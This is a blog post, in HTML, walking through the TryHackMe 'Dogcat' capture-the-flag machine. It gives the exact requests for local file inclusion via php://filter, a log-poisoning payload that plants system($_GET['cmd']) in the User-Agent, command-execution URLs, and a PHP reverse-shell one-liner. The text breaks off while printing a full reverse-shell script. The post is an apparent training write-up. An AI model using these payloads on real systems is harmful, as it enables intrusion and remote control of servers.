@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Hey there! Today I am going to walk you through the Dogcat machine on TryHackMe The first thing I always do is to export the IP to a global variable. So from now on $IP will refer to the IP of the tar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dogcat - TryHackMe">
+<meta property="og:url" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/">
+<meta property="og:site_name" content="Devlog Diaries">
+<meta property="og:description" content="Hey there! Today I am going to walk you through the Dogcat machine on TryHackMe The first thing I always do is to export the IP to a global variable. So from now on $IP will refer to the IP of the tar">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/lfi.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/lfi2.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/burp.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/logpoisining.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag1.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag1.1.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag2.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag2.2.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/sudo.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/gtfobins.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/whoamiroot.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag3.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/secondRootShell.png">
+<meta property="og:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/flag4.png">
+<meta property="article:published_time" content="2020-07-11T06:23:57.000Z">
+<meta property="article:modified_time" content="2020-07-11T08:17:05.522Z">
+<meta property="article:author" content="Ecrax">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/lfi.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Dogcat - TryHackMe</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archive</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/07/09/Mr-Robot-TryHackMe/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&text=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&is_video=false&description=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Dogcat - TryHackMe&body=Check out this article: http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&title=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&name=Dogcat - TryHackMe&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://ecrax.github.io/2020/07/11/Dogcat-TryHackMe/&t=Dogcat - TryHackMe" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Access"><span class="toc-number">2.</span> <span class="toc-text">Gaining Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1"><span class="toc-number">3.1.</span> <span class="toc-text">Flag 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2"><span class="toc-number">3.2.</span> <span class="toc-text">Flag 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-Root"><span class="toc-number">4.</span> <span class="toc-text">Getting Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3"><span class="toc-number">4.1.</span> <span class="toc-text">Flag 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4"><span class="toc-number">4.2.</span> <span class="toc-text">Flag 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-End"><span class="toc-number">5.</span> <span class="toc-text">The End</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Dogcat - TryHackMe
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Devlog Diaries</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-11T06:23:57.000Z" itemprop="datePublished">2020-07-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pentesting/">pentesting</a> › <a class="category-link" href="/categories/pentesting/writeups/">writeups</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Hey there! Today I am going to walk you through the Dogcat machine on <a href="https://tryhackme.com/room/dogcat" target="_blank" rel="noopener">TryHackMe</a></p>
+<p>The first thing I always do is to export the IP to a global variable. So from now on $IP will refer to the IP of the target machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=&#123;Machine IP&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>So as always let’s start with an nmap scan.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oN nmap/initial</span><br></pre></td></tr></table></figure>
+
+<p>This is what came back:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-10 06:27 EDT</span><br><span class="line">Nmap scan report for 10.10.39.107</span><br><span class="line">Host is up (0.045s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)</span><br><span class="line">|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)</span><br><span class="line">|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: dogcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds</span><br></pre></td></tr></table></figure>
+
+<p>So as we can see, there is a webserver on port 80 and a ssh access. We should first have a look at the webserver, as we can’t really do anything to the shh port at the moment.</p>
+<h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>We are greeted with a webpage about dog and cat pictures. If we click on one of the buttons we get either a picture of a dog or a cat respectively. On first glance there is no obvious entry point we could exploit, but if we have a look at the URL we should notice somehthing.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=dog</span><br></pre></td></tr></table></figure>
+
+<p>Once we clicked on a button the URL has a view parameter with “dog” or “cat” assigned. I instantly thought of Local File Inclusion (LFI), so let’s try something:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>But sadly the developer of the webpage took care of that and checks wether or not “dog” or “cat” is in the value of the view parameter, so once we write “dog” somewhere in the path, we see this:</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/lfi.png" class="" title="LFI">
+
+<p>Apparently warnings were not disabled in the php settings, so we can see that there was an error in the “include()” function. We can also see that the contents of the view parameter are being passed straight into that function, and that they automatically append a .php extension, somewhere in the code.</p>
+<p>So what can we do with this information? We need to find a way to exfiltrate information from that webpage. I came accross <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/" target="_blank" rel="noopener">this</a> website. Let’s try this:</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/lfi2.png" class="" title="LFI">
+
+<p>Awesome it worked!</p>
+<p>Of course this is still base64, but we can easily decode that online for example <a href="https://www.base64decode.org/" target="_blank" rel="noopener">here</a>.<br>Just to recap, we used this URL:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/convert.base64-encode/resource=./dog/../index</span><br></pre></td></tr></table></figure>
+
+<p>To show the code of the index page, encoded in base64. If we deocde this, we can see the source code of the index page, which let’s us see what is going on under the hood.</p>
+<p>The exfiltrated code:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;dogcat&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"/style.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;dogcat&lt;/h1&gt;</span><br><span class="line">    &lt;i&gt;a gallery of various dogs <span class="keyword">or</span> cats&lt;/i&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;What would you like to see?&lt;/h2&gt;</span><br><span class="line">        &lt;a href=<span class="string">"/?view=dog"</span>&gt;&lt;button id=<span class="string">"dog"</span>&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=<span class="string">"/?view=cat"</span>&gt;&lt;button id=<span class="string">"cat"</span>&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">containsStr</span><span class="params">($str, $substr)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> strpos($str, $substr) !== <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	    $ext = <span class="keyword">isset</span>($_GET[<span class="string">"ext"</span>]) ? $_GET[<span class="string">"ext"</span>] : <span class="string">'.php'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'view'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(containsStr($_GET[<span class="string">'view'</span>], <span class="string">'dog'</span>) || containsStr($_GET[<span class="string">'view'</span>], <span class="string">'cat'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Here you go!'</span>;</span><br><span class="line">                    <span class="keyword">include</span> $_GET[<span class="string">'view'</span>] . $ext;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Sorry, only dogs or cats are allowed.'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now we can see what is going on with the automatic .php extension.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ext = <span class="keyword">isset</span>($_GET[<span class="string">"ext"</span>]) ? $_GET[<span class="string">"ext"</span>] : <span class="string">'.php'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'view'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(containsStr($_GET[<span class="string">'view'</span>], <span class="string">'dog'</span>) || containsStr($_GET[<span class="string">'view'</span>], <span class="string">'cat'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Here you go!'</span>;</span><br><span class="line">                    <span class="keyword">include</span> $_GET[<span class="string">'view'</span>] . $ext;</span><br></pre></td></tr></table></figure>
+
+<p>If you don’t know php, here is what it basically does:<br>It checks if there is a “ext” parameter in the URL. If there is not, it uses a .php extension and else it uses whatever it was given in the URL. Then of course it includes whatever file is specified in the view parameter, with the given extension.</p>
+<p>With this knowledge we can things like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.39.107/?view=php://filter/resource=./dog/../../../../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure>
+
+<p>To extraxt the linux password file:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>
+
+<p>Sadly we can not find any passwords or anything else interesting here, so we have to dig deeper.</p>
+<p>The next thing we should try is log poisining. We are really just injecting a pice of php code into the log, to get remote code execution. Let’s first check where the log is. From our nmap scan we know that it is an apache2 server. So just try all the default locations. This is where I found it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure>
+
+<p>This is a snippet of the log:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;YOUR_IP&#125; - - [10&#x2F;Jul&#x2F;2020:10:27:35 +0000] &quot;GET &#x2F;cats&#x2F;4.jpg HTTP&#x2F;1.1&quot; 200 17994 &quot;http:&#x2F;&#x2F;$IP&#x2F;?view&#x3D;cat&quot; &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>It’s syntax is like this:</p>
+<p><strong>{ACCESSING_IP} - - [TIME] “{REQUEST}” {RESPONSE_CODE} {I_DUNNO} “{URL}” “{USER_AGENT}”</strong></p>
+<p>The part we can modify to display php code, is the User Agent.</p>
+<p>You can either do this with a python script or with Burp-Suite.<br>Here is the python script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://$IP/?view=cat'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'&lt;?php system($_GET['</span>cmd<span class="string">']); ?&gt;'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>But I did it with Burp as well.</p>
+<p>If you want a more detailed description just google how to edit a User Agent with Burp-Suite.</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/burp.png" class="" title="Burp-Suite">
+
+<p>We now have remote code execution, by passing a linux command to the “cmd” paramter in the URL. We can see the results of that command if we open up the log file again. So if we try to run “whoami” like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<p>We can see this result in the logs (To find it more quickly the next time, copy the time stamp where the result of the whoami command showed up and search for it the next time. Then you will jump to the correct line automatically):</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/logpoisining.png" class="" title="Logpoisining">
+
+<p>As expected we are “www-data”.</p>
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h3><p>To get an overview of what we are working with let’s also run “ls -l”.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=ls%20<span class="_">-l</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/11/Dogcat-TryHackMe/flag1.png" class="" title="lsResults">
+
+<p>Oh hey, there we have our first flag! We can see the content of the file like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=cat%20flag.php</span><br></pre></td></tr></table></figure>
+
+<p><em>It is in the current working directory (/var/www/html/)</em></p>
+<p>The result:</p>
+<img src="/2020/07/11/Dogcat-TryHackMe/flag1.1.png" class="" title="flag1">
+
+<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h3><p>The second flag is pretty much as easy as the first one, it is just one directory up.</p>
+<p><em>One up from the current directory (/var/www/)</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=ls%20<span class="_">-l</span>%20..</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/11/Dogcat-TryHackMe/flag2.png" class="" title="flag2ls">
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=cat ../flag2_QMW7JvaY2LvK.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/11/Dogcat-TryHackMe/flag2.2.png" class="" title="flag2">
+
+<p>For the 3rd and 4th flag we will need a proper reverse shell with root access. I couldn’t get a shell by running a reverse shell from the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">PentestMonkey-ReverseShell-CheatSheet</a>, like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=php -r <span class="string">'$sock=fsockopen("&#123;TUN0&#125;"",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<p>Maybe it was just me, but I decided to just download a php reverse shell from my computer with curl.</p>
+<p>For that I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">this</a> reverse shell and modified it with my ip and the 9999 port.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 